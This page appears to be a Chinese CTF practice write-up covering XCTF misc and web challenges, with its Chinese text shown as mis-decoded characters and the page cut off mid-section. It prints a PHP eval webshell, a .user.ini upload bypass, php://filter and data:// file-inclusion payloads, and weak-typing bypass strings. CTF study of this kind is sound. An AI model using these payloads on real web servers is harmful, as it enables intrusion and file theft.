<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="xctfåˆ·é¢˜ å¿ƒä»ªçš„å…¬å¸ï¼ˆmisc) ä½¿ç”¨ linux strings å‘½ä»¤æŸ¥çœ‹ å¯¹{è¿›è¡ŒåŒ¹é… strings webshell.pcapng | grep {\nå¾—åˆ°flag\næˆ–è€…\nwiresharkè¿‡æ»¤http contains &ldquo;shell&rdquo;\næŸ¥çœ‹è¿‡æ»¤å‡ºæ¥çš„åŒ…\næœ€åå°±æ˜¯flag\né€‚åˆä½œä¸ºæ¡Œé¢ï¼ˆmisc) stegsolveå‘ç°äºŒç»´ç æ‰«å‡ºä¸€ä¸²16è¿›åˆ¶\n">
<title>xctfåˆ·é¢˜</title>

<link rel='canonical' href='https://0d000721999.github.io/p/xctf%E5%88%B7%E9%A2%98/'>

<link rel="stylesheet" href="/scss/style.min.37a6022266b4205ec3a616ff86e34064f3524e0913faf185a3d362063a8d7490.css"><meta property='og:title' content="xctfåˆ·é¢˜">
<meta property='og:description' content="xctfåˆ·é¢˜ å¿ƒä»ªçš„å…¬å¸ï¼ˆmisc) ä½¿ç”¨ linux strings å‘½ä»¤æŸ¥çœ‹ å¯¹{è¿›è¡ŒåŒ¹é… strings webshell.pcapng | grep {\nå¾—åˆ°flag\næˆ–è€…\nwiresharkè¿‡æ»¤http contains &ldquo;shell&rdquo;\næŸ¥çœ‹è¿‡æ»¤å‡ºæ¥çš„åŒ…\næœ€åå°±æ˜¯flag\né€‚åˆä½œä¸ºæ¡Œé¢ï¼ˆmisc) stegsolveå‘ç°äºŒç»´ç æ‰«å‡ºä¸€ä¸²16è¿›åˆ¶\n">
<meta property='og:url' content='https://0d000721999.github.io/p/xctf%E5%88%B7%E9%A2%98/'>
<meta property='og:site_name' content='ç¾å’•å™œçš„å°ç«™'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='åˆ·é¢˜' /><meta property='article:published_time' content='2025-01-11T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-01-11T00:00:00&#43;00:00'/><meta property='og:image' content='https://0d000721999.github.io/p/xctf%E5%88%B7%E9%A2%98/1.webp' />
<meta name="twitter:title" content="xctfåˆ·é¢˜">
<meta name="twitter:description" content="xctfåˆ·é¢˜ å¿ƒä»ªçš„å…¬å¸ï¼ˆmisc) ä½¿ç”¨ linux strings å‘½ä»¤æŸ¥çœ‹ å¯¹{è¿›è¡ŒåŒ¹é… strings webshell.pcapng | grep {\nå¾—åˆ°flag\næˆ–è€…\nwiresharkè¿‡æ»¤http contains &ldquo;shell&rdquo;\næŸ¥çœ‹è¿‡æ»¤å‡ºæ¥çš„åŒ…\næœ€åå°±æ˜¯flag\né€‚åˆä½œä¸ºæ¡Œé¢ï¼ˆmisc) stegsolveå‘ç°äºŒç»´ç æ‰«å‡ºä¸€ä¸²16è¿›åˆ¶\n"><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='https://0d000721999.github.io/p/xctf%E5%88%B7%E9%A2%98/1.webp' />
    <link rel="shortcut icon" href="/favicon.ico" />

    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            localStorage.setItem(colorSchemeKey, "light");
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="åˆ‡æ¢èœå•">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu988272603220494224.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">ğŸ˜‹</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">ç¾å’•å™œçš„å°ç«™</a></h1>
            <h2 class="site-description">Cialloï½(âˆ ãƒ»Ï‰&lt; )âŒ’â˜…</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://buuoj.cn/users/175721'
                        target="_blank"
                        title="BUUOJ"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-letter-b" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M7 20v-16h6a4 4 0 0 1 0 8a4 4 0 0 1 0 8h-6" />
  <line x1="7" y1="12" x2="13" y2="12" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://github.com/0d000721999'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>ä¸»é¡µ</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%85%B3%E4%BA%8E/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>å…³äº</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        
        
        <li >
            <a href='/friends/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



                
                <span>Friends</span>
            </a>
        </li>
        
        
        <li >
            <a href='/links/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>Links</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">ç›®å½•</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#å¿ƒä»ªçš„å…¬å¸misc">å¿ƒä»ªçš„å…¬å¸ï¼ˆmisc)</a></li>
    <li><a href="#é€‚åˆä½œä¸ºæ¡Œé¢misc">é€‚åˆä½œä¸ºæ¡Œé¢ï¼ˆmisc)</a></li>
    <li><a href="#back--upweb">back  up(web)</a></li>
    <li><a href="#simple_phpweb">simple_php(web)</a></li>
    <li><a href="#easyuploadweb">easyuploadï¼ˆwebï¼‰</a></li>
    <li><a href="#fileincludeweb">fileinclude(web)</a></li>
    <li><a href="#filecludeweb">fileclude(web)</a></li>
    <li><a href="#easyphpweb">easyphp(web)</a></li>
    <li><a href="#file_includeweb">file_include(web)</a>
      <ol>
        <li><a href="#phpä¼ªåè®®è¯»æ–‡ä»¶çš„å…¶ä»–æ–¹å¼">php://ä¼ªåè®®è¯»æ–‡ä»¶çš„å…¶ä»–æ–¹å¼</a></li>
      </ol>
    </li>
    <li><a href="#unsepingweb">unseping(web)</a></li>
    <li><a href="#web_python_template_injectionweb">Web_python_template_injection(web)</a>
      <ol>
        <li><a href="#ssti">SSTI</a></li>
        <li><a href="#å®˜æ–¹wp">å®˜æ–¹WP</a></li>
      </ol>
    </li>
    <li><a href="#web_php_unserializeweb">Web_php_unserialize(web)</a></li>
    <li><a href="#php_rce">php_rce</a></li>
    <li><a href="#web_php_include">Web_php_include</a></li>
    <li><a href="#catcat-new">catcat-new</a></li>
    <li><a href="#mfw">mfw</a></li>
    <li><a href="#ics-05">ics-05</a></li>
    <li><a href="#easytornado">easytornado</a></li>
    <li><a href="#shrine">shrine</a></li>
    <li><a href="#fakebook">fakebook</a></li>
    <li><a href="#very_easy_sql">very_easy_sql</a></li>
    <li><a href="#can_has_stdiomisc">can_has_stdio?ï¼ˆmisc)</a></li>
    <li><a href="#glance-50misc">glance-50(misc)</a></li>
    <li><a href="#miss_01misc">miss_01(misc)</a></li>
    <li><a href="#wire1misc">Wire1(misc)</a></li>
    <li><a href="#catweb">Cat(web)</a></li>
    <li><a href="#flatscience">FlatScience</a></li>
    <li><a href="#wife_wife">wife_wife</a></li>
    <li><a href="#confusion1">Confusion1</a></li>
    <li><a href="#ezbypass-cat">ezbypass-cat</a></li>
    <li><a href="#ez_curl">ez_curl</a></li>
    <li><a href="#bug">bug</a></li>
    <li><a href="#wzsc_æ–‡ä»¶ä¸Šä¼ ">wzsc_æ–‡ä»¶ä¸Šä¼ </a></li>
    <li><a href="#é¢˜ç›®åç§°-warmup">é¢˜ç›®åç§°-warmup</a></li>
    <li><a href="#badprogrammer">BadProgrammer</a></li>
    <li><a href="#i-got-id-200">i-got-id-200</a></li>
    <li><a href="#wtfsh-150">wtf.sh-150</a></li>
    <li><a href="#web_php_wrong_nginx_config">Web_php_wrong_nginx_config</a></li>
    <li><a href="#zhuanxv">Zhuanxv</a></li>
    <li><a href="#filemanager">filemanager</a></li>
    <li><a href="#comment">comment</a></li>
    <li><a href="#upload">upload</a></li>
    <li><a href="#smarty">smarty</a></li>
    <li><a href="#ics-02">ics-02</a></li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/xctf%E5%88%B7%E9%A2%98/">
                <img src="/p/xctf%E5%88%B7%E9%A2%98/1.webp"
                        
                        width="5416" 
                        height="2894" 
                        loading="lazy"
                        alt="Featured image of post xctfåˆ·é¢˜" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/%E5%88%B7%E9%A2%98%E6%89%93%E9%9D%B6/" style="background-color: #264653; color: #fff;">
                åˆ·é¢˜&amp;&amp;æ‰“é¶
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/xctf%E5%88%B7%E9%A2%98/">xctfåˆ·é¢˜</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Jan 11, 2025</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    é˜…è¯»æ—¶é•¿: 45 åˆ†é’Ÿ
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h1 id="xctfåˆ·é¢˜">xctfåˆ·é¢˜
</h1><h2 id="å¿ƒä»ªçš„å…¬å¸misc">å¿ƒä»ªçš„å…¬å¸ï¼ˆmisc)
</h2><p>ä½¿ç”¨ linux strings å‘½ä»¤æŸ¥çœ‹
å¯¹{è¿›è¡ŒåŒ¹é…
strings webshell.pcapng | grep {</p>
<p>å¾—åˆ°flag</p>
<p>æˆ–è€…</p>
<p>wiresharkè¿‡æ»¤http contains &ldquo;shell&rdquo;</p>
<p>æŸ¥çœ‹è¿‡æ»¤å‡ºæ¥çš„åŒ…</p>
<p>æœ€åå°±æ˜¯flag</p>
<h2 id="é€‚åˆä½œä¸ºæ¡Œé¢misc">é€‚åˆä½œä¸ºæ¡Œé¢ï¼ˆmisc)
</h2><p>stegsolveå‘ç°äºŒç»´ç æ‰«å‡ºä¸€ä¸²16è¿›åˆ¶</p>
<p>ä¸¢è¿›010ï¼Œæ˜¯pycæ–‡ä»¶ï¼Œåç¼€ä¿®æ”¹ä¸º.pyc</p>
<p>Easy Python Decompilerå¯¹æ–‡ä»¶è¿›è¡Œåç¼–è¯‘ã€‚åç¼–è¯‘åç”¨vimæŸ¥çœ‹æºç </p>
<p>ä¸€ä¸²å‡½æ•°æ²¡è¢«è°ƒç”¨ï¼Œç›´æ¥è¡¥ä¸Šflag()</p>
<h2 id="back--upweb">back  up(web)
</h2><p>å¤‡ä»½æ–‡ä»¶æŸ¥çœ‹çš„åç¼€</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">â€œ.gitâ€ ã€â€œ.svnâ€ã€â€œ .swpâ€â€œ.~â€ã€â€œ.bakâ€ã€â€œ.bash_historyâ€ã€â€œ.bkfâ€ 
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é¢˜.bakä¸‹è½½æ–‡ä»¶ç”¨è®°äº‹æœ¬æ‰“å¼€çœ‹åˆ°flag</p>
<h2 id="simple_phpweb">simple_php(web)
</h2><p>phpå¼±ç±»å‹æ¯”è¾ƒ</p>
<p>aä¸0æ¯”è¾ƒå‰ä¼šè½¬æˆç›¸åŒçš„æ•°æ®ç±»å‹æ‰€ä»¥aå¯ä»¥æ˜¯ä»»æ„å­—ç¬¦ä¸²ç»“æœä¸º0ï¼›</p>
<p>bä¸èƒ½æ˜¯æ•°å­—ä½†æ˜¯è¦å¤§äº1234ï¼Œæˆ‘ä»¬ç›´æ¥æŠŠå¤§äº1234çš„æ•°ä¸ä»»æ„å­—ç¬¦ä¸²æ‹¼æ¥</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250111174740608.png"
	width="1279"
	height="661"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250111174740608_hu12049528235250110247.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250111174740608_hu13685509414097722706.png 1024w"
	loading="lazy"
	
		alt="image-20250111174740608"
	
	
		class="gallery-image" 
		data-flex-grow="193"
		data-flex-basis="464px"
	
></p>
<h2 id="easyuploadweb">easyuploadï¼ˆwebï¼‰
</h2><p>è¿™é¢˜å°è¯•äº†å¾ˆå¤šåŠæ³•</p>
<p>æœ€åç”¨.user.iniçš„æ–¹å¼ä¸Šä¼ æˆåŠŸ</p>
<p>å…ˆä¸Šä¼ .user.ini</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">.user.ini é…ç½®é¡¹ä¸­æœ‰ä¸¤ä¸ªé…ç½®å¯ä»¥èµ·åˆ°ä¸€äº›ä½œç”¨
</span></span><span class="line"><span class="cl">æ–¹æ³•ä¸€ï¼š
</span></span><span class="line"><span class="cl">auto_prepend_file = &lt;filename&gt;         //åŒ…å«åœ¨æ–‡ä»¶å¤´
</span></span><span class="line"><span class="cl">æ–¹æ³•äºŒï¼š
</span></span><span class="line"><span class="cl">auto_append_file = &lt;filename&gt;          //åŒ…å«åœ¨æ–‡ä»¶å°¾
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ–‡ä»¶åæˆ‘ä»¬å†™shell.jpg</p>
<p>ç„¶åbpæ”¹åŒ…</p>
<p>æ³¨æ„è¦åœ¨è¿™é‡Œ</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250111193921060.png"
	width="639"
	height="105"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250111193921060_hu5642512607850009542.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250111193921060_hu8188563888349475600.png 1024w"
	loading="lazy"
	
		alt="image-20250111193921060"
	
	
		class="gallery-image" 
		data-flex-grow="608"
		data-flex-basis="1460px"
	
></p>
<p>æ–‡ä»¶å¤´åŠ ä¸ŠGIF89aæ‰ä¼šä¸Šä¼ æˆåŠŸ</p>
<p>ç„¶åå°±æ˜¯shell.jpgé‡Œé¢çš„æœ¨é©¬æœ€ç¨³å®šçš„æ˜¯</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?=eval($_POST[&#39;cmd&#39;]);?&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä¸Šä¼ æˆåŠŸååˆ©ç”¨åˆ°ç‰¹æ€§<code>user.ini</code>å’Œ<code>shell.jpg</code>åŒä¸€ç›®å½•ä¸‹çš„æ‰€æœ‰phpæ–‡ä»¶éƒ½ä¼šåŒ…å«<code>shell.jpg</code>æ–‡ä»¶</p>
<p>èšå‰‘è¿æ¥index.phpï¼Œå¯†ç ä¸ºcmdå³å¯</p>
<h2 id="fileincludeweb">fileinclude(web)
</h2><p>æŸ¥çœ‹æºç </p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250111200423996.png"
	width="685"
	height="486"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250111200423996_hu4795921870539599483.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250111200423996_hu6458834748485662527.png 1024w"
	loading="lazy"
	
		alt="image-20250111200423996"
	
	
		class="gallery-image" 
		data-flex-grow="140"
		data-flex-basis="338px"
	
></p>
<p>å¤§æ¦‚æ„æ€å°±æ˜¯åœ¨cookieçš„ä½ç½®ç»™languageå¡«å€¼ä¼šä¼ ç»™å˜é‡lanè®©index.phpåŒ…å«ä¸Šlan.phpçš„ä¸œè¥¿</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250111201325047.png"
	width="1915"
	height="525"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250111201325047_hu11996669394772244791.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250111201325047_hu16514559682098325715.png 1024w"
	loading="lazy"
	
		alt="image-20250111201325047"
	
	
		class="gallery-image" 
		data-flex-grow="364"
		data-flex-basis="875px"
	
></p>
<p>ç”±äºæºç ä¸­ä¼šåŠ .phpæ‰€ä»¥æˆ‘ä»¬åªä¼ å€¼ä¸º</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">php</span><span class="p">:</span><span class="o">//</span><span class="n">filter</span><span class="o">/</span><span class="n">read</span><span class="o">=</span><span class="nb">convert</span><span class="o">.</span><span class="n">base64</span><span class="o">-</span><span class="n">encode</span><span class="o">/</span><span class="n">resource</span><span class="o">=/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">flag</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åæ”¾è¡Œå°±å¾—åˆ°ç¼–ç åçš„flag</p>
<h2 id="filecludeweb">fileclude(web)
</h2><p>file1å¾ˆå¥½åˆ©ç”¨è·Ÿä¸Šé¢ä¸€æ ·base64ç¼–ç flag.phpæ–‡ä»¶</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?file1=php://filter/read=convert.base64-encode/resource=flag.php
</span></span></code></pre></td></tr></table>
</div>
</div><p>file2è¦å†…å®¹åŒ…å«hello ctf</p>
<p>ç¬¬ä¸€ç§åŠæ³•åœ¨dataæ•°æ®æµä¸­åŠ å…¥hello ctf</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">file2=data://text/plain,hello ctf
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç¬¬äºŒç§ç”¨php://input</p>
<p>ç„¶ååœ¨posté‡Œé¢ä¼ hello ctf</p>
<p>hackbarè¦ä¼ é”®å€¼å¯¹çš„å½¢å¼ hello ctf=hello ctf</p>
<p>ç„¶åbpæŠ“åŒ…æŠŠé”®åˆ æ‰æ”¾è¡Œ</p>
<p>base64è§£ç å‡ºflag</p>
<h2 id="easyphpweb">easyphp(web)
</h2><p>ä»£ç å®¡è®¡</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250111211646550.png"
	width="913"
	height="315"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250111211646550_hu5848579455175082551.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250111211646550_hu15066743949140273861.png 1024w"
	loading="lazy"
	
		alt="image-20250111211646550"
	
	
		class="gallery-image" 
		data-flex-grow="289"
		data-flex-basis="695px"
	
></p>
<p>intvalå‡½æ•°è¿”å›æ•´å‹çš„å€¼</p>
<p>æˆ‘ä»¬ç”¨ç§‘å­¦è®¡æ•°æ³•å°±ç»•è¿‡äº†1e9|1e8|1e7éƒ½è¡Œ</p>
<p>ç„¶åbè·‘è„šæœ¬</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250111212655749.png"
	width="1734"
	height="962"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250111212655749_hu13576408585323507237.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250111212655749_hu6443324753388567888.png 1024w"
	loading="lazy"
	
		alt="image-20250111212655749"
	
	
		class="gallery-image" 
		data-flex-grow="180"
		data-flex-basis="432px"
	
></p>
<p>å¾—å‡º53724</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250111213143332.png"
	width="880"
	height="285"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250111213143332_hu6712889165123142695.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250111213143332_hu7179563555160957518.png 1024w"
	loading="lazy"
	
		alt="image-20250111213143332"
	
	
		class="gallery-image" 
		data-flex-grow="308"
		data-flex-basis="741px"
	
></p>
<p>ç„¶åcæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œæœ€åè¦ä¸ºjsonæ ¼å¼ï¼Œcä¸­mä¸æ˜¯æ•°å­—ä½†è¦&gt;2022,ç”¨å‰é¢å­¦åˆ°çš„æ•°å­—æ‹¼æ¥å­—ç¬¦ä¸²ç»•è¿‡2023a</p>
<p>cä¸­çš„né•¿åº¦ä¸º2ï¼Œä¸”ä¸ºäºŒç»´æ•°ç»„ï¼Œå°±æ˜¯[[..],..]çš„å½¢å¼</p>
<p>è¦ç»•è¿‡çš„æ˜¯array_searchå‡½æ•°</p>
<p>c[n]ä¸­å¿…é¡»æœ‰DGGJ,åé¢å¯¹æ•°ç»„å€¼åˆ¤æ–­æœ‰DGGJå°±ç»ˆæ­¢</p>
<p>ä¸Šé¢è·Ÿå­—ç¬¦ä¸²æ¯”è¾ƒæ•°å­—ä¸€æ ·çš„åŸç†</p>
<p>array_searchå‡½æ•°æ˜¯å¼±æ¯”è¾ƒï¼Œæ‰€ä»¥ç”¨0ä»£æ›¿DGGJ</p>
<p>payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?a=1e9&amp;b=53724&amp;c={&#34;m&#34;:&#34;2023c&#34;,&#34;n&#34;:[[],0]}
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="file_includeweb">file_include(web)
</h2><p>æ–‡ä»¶åŒ…å«</p>
<p>å°è¯•ç”¨è½¬base64ç¼–ç æ–¹æ³•æŸ¥çœ‹check.php</p>
<p>ä½†æ˜¯è¯•äº†ä¸€ä¸‹å‘ç°éƒ½è¢«è¿‡æ»¤äº†</p>
<h3 id="phpä¼ªåè®®è¯»æ–‡ä»¶çš„å…¶ä»–æ–¹å¼">php://ä¼ªåè®®è¯»æ–‡ä»¶çš„å…¶ä»–æ–¹å¼
</h3><p>convert.<em>è¿‡æ»¤å™¨æ”¯æŒconvert.iconv.</em> æ ¼å¼ï¼Œä½¿ç”¨æ–¹æ³•ï¼š</p>
<p><code>convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt;</code>
æˆ–
<code>convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt; </code></p>
<p>ä¾‹å¦‚ï¼š</p>
